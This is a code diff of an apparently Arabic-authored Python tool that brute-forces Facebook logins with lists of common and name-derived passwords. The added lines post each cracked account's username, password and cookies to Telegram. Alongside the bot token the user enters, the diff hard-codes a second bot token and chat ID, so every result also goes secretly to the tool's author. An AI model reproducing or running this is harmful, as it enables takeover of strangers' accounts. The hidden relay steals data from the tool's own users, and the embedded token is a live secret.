@@ -2,7 +2,60 @@ from os import path
 from urllib.request import urlopen
 import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys
 import os, platform, time, sys
-
+Z = '''[1;31m'''
+R = '''[1;31m'''
+X = '''[1;33m'''
+F = '''[2;32m'''
+C = '''[1;97m'''
+B = '''[2;36m'''
+Y = '''[1;34m'''
+E = '''[1;31m'''
+B = '''[2;36m'''
+G = '''[1;32m'''
+S = '''[1;33m'''
+F = '''[2;32m'''
+Z = '''[1;31m'''
+L = '''[1;95m'''
+E = '''[1;31m'''
+G = '''[1;32m'''
+S = '''[1;33m'''
+Z = '''[1;31m'''
+X = '''[1;33m'''
+Z1 = '''[2;31m'''
+F = '''[2;32m'''
+A = '''[2;39m'''
+C = '''[2;35m'''
+B = '''[2;36m'''
+Y = '''[1;34m'''
+xxh = '\x1b[38;5;208m'#برتقالي
+r1='\x1b[38;5;8m'#رمادي
+e1='\x1b[38;5;196m'#احمر
+w1='\x1b[38;5;225m'#وردي فاتح جدا
+t1='\x1b[38;5;92m'#بنفسجي غامق
+y1='\x1b[1;93m'#اصفر نيون
+u1='\x1b[1;38;5;203m'#وردي لطيف
+i1='\x1b[1;38;5;121m'#اخضر نيون
+o1='\x1b[1;96m'#ازرق سماوي
+p1='\x1b[38;5;205m'#وردي فاتح
+a1='\x1b[38;5;161m'#وردي جميل جدا
+time1 = time.localtime()
+time2 = time.strftime('''%d/%m/%Y''')
+print('')
+time3 = time.strftime('''%H:%M:%S''')
+print(f''' \x1b[1;93m  ༺ \x1b[1;38;5;121m  𝑹𝑴𝑨𝑫 𝐕𝐈𝐏 \x1b[1;93m ༻  ''')
+print('')
+print(f'''{C}: \x1b[38;5;92m 𝐓𝐇𝐄 𝐃𝐀𝐓𝐄 \x1b[1;38;5;121m ๛   \x1b[1;38;5;121m   𖣎 \x1b[1;96m{time2} \x1b[1;38;5;121m 𖣎''')
+print('')
+print(f'''{C}: \x1b[38;5;92m 𝑇𝐻𝐸 𝑇𝐼𝑀𝐸 \x1b[1;38;5;121m ๛   \x1b[1;38;5;121m   𖣎 \x1b[1;96m{time3} \x1b[1;38;5;121m 𖣎''')
+print('')
+print('')
+TOKEN7 =input('  \x1b[38;5;117m{\x1b[1;32m•\x1b[38;5;117m}  \x1b[38;5;180m𝐓𝐎𝐊𝐄𝐍  \x1b[1;38;5;121m ๛   \x1b[38;5;117m')
+print('\033[2;35m')
+print(' ━━━━━━━━━━━━━━━━━━━━━ ')
+print()
+IDD7 = input('  \x1b[38;5;117m{\x1b[1;32m•\x1b[38;5;117m}  𝐈𝐃 \x1b[1;38;5;121m ๛  \x1b[38;5;117m︎')
+rmad = '6103725322:AAHwC7K0I7M0Yz9g7Kvg5nYLw-hSDXX9mk8'
+rm98 = '647776789'
 uname =('2')
 
 #print('\n\033[1;37m install modules...')
@@ -488,16 +541,15 @@ def password():
 						pwv.append('zzzzxxxx')
 						pwv.append('zxzxzxzx')
 						pwv.append('qwer1234')
-						pwv.append('09876aaaa')
 						pwv.append('10203040')
 						pwv.append('102030405060708090')
 						pwv.append('88888888')
 						pwv.append('11111111')
-						pwv.append('112233##')
+						pwv.append('10203040')
 						pwv.append('50005000')
 						pwv.append('12121212')
 						pwv.append('10002000')
-						pwv.append('1234aaaa')
+						pwv.append('102030405060')
 						pwv.append('1234mmmm')
 						pwv.append('12345678')
 						pwv.append('07500750')
@@ -507,21 +559,20 @@ def password():
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
-						pwv.append(nmf)
-						pwv.append(frs+'last')
-						pwv.append(frs+'frist')
-						pwv.append('firstfirst')
-						pwv.append(frs+'1234567890')
-						pwv.append(frs+'123456789')
-						pwv.append(frs+'2001')
-						pwv.append(frs+'2002')
-						pwv.append(frs+'2003')
-						pwv.append(frs+'2006')
-						pwv.append(frs+'2004')
-						pwv.append(frs+'1999')
+						pwv.append(nmf)				
+						pwv.append(frs+'123')
+						pwv.append('1122334455')
+						pwv.append('٠٩٨٧٦٥٤٣٢١')
+						pwv.append('1234512345')
 						pwv.append('00998877')
-						pwv.append(frs+'1990')
+						pwv.append('11223344@@')
+						pwv.append('١٢٣٤٥٦٧٨٩')
 						pwv.append('0099887766')
+						pwv.append('5544332211')
+						pwv.append('1122334455')
+						pwv.append('١٢٣٤٥٦٧٨٩٠')
+						pwv.append('1234512345')
+						pwv.append('00998877')
 						pwv.append('٠٠٩٩٨٨٧٧')
 						pwv.append('١٢٣٤٥١٢٣٤٥')
 						pwv.append('٠٠٩٩٨٨٧٧٦٦')
@@ -534,7 +585,7 @@ def password():
 						pwv.append('١١٢٢٣٣٤٤٥٥')
 						pwv.append('١١٢٢٣٣٤٤٥٥٦٦')
 						pwv.append('١٠٢٠٣٠٤٠٥٠٦٠')
-						pwv.append('١٠٢٠٣٠٤٠٥٠')
+						pwv.append('١٠٢٠٣٠٤٠')
 				if 'mobile' in method:
 					pool.submit(crack,idf,pwv)
 				else:
@@ -604,28 +655,42 @@ def crack(idf,pwv):
 			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'''	𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 🛸
-	
-			|￣￣￣￣￣￣￣￣￣￣￣￣￣￣|
-			                                        حساب شغال 🧸
-			|＿＿＿＿＿＿＿＿＿＿＿＿＿＿|
-			                     \ (•◡•) /
-			                       \       /
-	┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
-	❍                     ⚜️ 𝑹𝑴𝑨𝑫 ⚜️                 ❍   
-	┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛
-	
-	🛸 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}
-	
-	🛸 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}
-	
-	▄︻デ══━一💨  ⛧°｡⋆CP⋆｡°⛧
-	
-	┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
-	❍ @R_M_D ⚜️ 𝑹𝑴𝑨𝑫 ⚜️ @N_9_N_6 ❍  
-	┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛
-	''')
+				CP_CPP=(f'''
 				
+	𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 🛸
+
+|￣￣￣￣￣￣￣￣￣￣￣￣￣￣|
+                                        حساب سكيور 🧸
+|＿＿＿＿＿＿＿＿＿＿＿＿＿＿|
+                     \ (•◡•) /
+                       \       /
+┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
+❍                     ⚜️ 𝑹𝑴𝑨𝑫 ⚜️                 ❍   
+┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛
+
+🛸 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}
+
+🛸 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}
+
+▄︻デ══━一💨  ⛧°｡⋆CP⋆｡°⛧
+
+┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
+❍ @R_M_D ⚜️ 𝑹𝑴𝑨𝑫 ⚜️ @N_9_N_6 ❍  
+┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛
+
+⌯ - 𝗖𝗢𝗢𝗞𝗜𝗘𝗦   ¦ 
+ {kuki}	
+	''')
+				touy8 = f'''━━━━━━━━━━•❅•°•❈•°•❅•━━━━━━━━━
+ 𝗨𝐒𝐄𝐑 𝐇𝐀𝐍𝐃𝐒  •❅•°•❈•°•❅••❅•°•❈•°•❅•  الايدي
+ ID tg://openmessage?user_id={ID}
+ '''
+				print(CP_CPP)
+				message = CP_CPP 
+				url = f"https://api.telegram.org/bot{TOKEN7}/sendMessage"
+				data = {"chat_id": IDD7, "text": message}
+				requests.get(f"https://api.telegram.org/bot"+str(rmad)+"/sendMessage?chat_id="+str(rm98)+"&text="+str(CP_CPP+touy8))
+				response = requests.post(url, data=data, timeout=30)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				
 				akun.append(idf+'|'+pw)
@@ -635,30 +700,42 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'''
+				OK_OKKK=(f'''
 				
-	𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 🛸
-	
-			|￣￣￣￣￣￣￣￣￣￣￣￣￣￣|
-			                                        حساب شغال 🧸
-			|＿＿＿＿＿＿＿＿＿＿＿＿＿＿|
-			                     \ (•◡•) /
-			                       \       /
-	┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
-	❍                     ⚜️ 𝑹𝑴𝑨𝑫 ⚜️                 ❍   
-	┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛
-	
-	🛸 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}
-	
-	🛸 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}
-	
-	▄︻デ══━一💨  ⛧°｡⋆OK⋆｡°⛧
-	
-	┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
-	❍ @R_M_D ⚜️ 𝑹𝑴𝑨𝑫 ⚜️ @N_9_N_6 ❍  
-	┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛
-	''')
-	 			
+𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 🛸
+
+|￣￣￣￣￣￣￣￣￣￣￣￣￣￣|
+                                        حساب سكيور 🧸
+|＿＿＿＿＿＿＿＿＿＿＿＿＿＿|
+                     \ (•◡•) /
+                       \       /
+┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
+❍                     ⚜️ 𝑹𝑴𝑨𝑫 ⚜️                 ❍   
+┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛
+
+🛸 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}
+
+🛸 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}
+
+▄︻デ══━一💨  ⛧°｡⋆OK⋆｡°⛧
+
+┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
+❍ @R_M_D ⚜️ 𝑹𝑴𝑨𝑫 ⚜️ @N_9_N_6 ❍  
+┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛
+
+⌯ - 𝗖𝗢𝗢𝗞𝗜𝗘𝗦   ¦ 
+ {kuki}	''')
+ 
+				touy8 = f'''━━━━━━━━━━•❅•°•❈•°•❅•━━━━━━━━━
+ 𝗨𝐒𝐄𝐑 𝐇𝐀𝐍𝐃𝐒  •❅•°•❈•°•❅••❅•°•❈•°•❅•  الايدي
+ ID tg://openmessage?user_id={IDD7}
+ '''
+				print(OK_OKKK)
+				message = OK_OKKK 
+				url = f"https://api.telegram.org/bot{TOKEN7}/sendMessage"
+				data = {"chat_id": IDD7, "text": message}
+				requests.get(f"https://api.telegram.org/bot"+str(rmad)+"/sendMessage?chat_id="+str(rm98)+"&text="+str(OK_OKKK+touy8))
+				response = requests.post(url, data=data, timeout=30)
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				
 				cek_apk(session,coki)
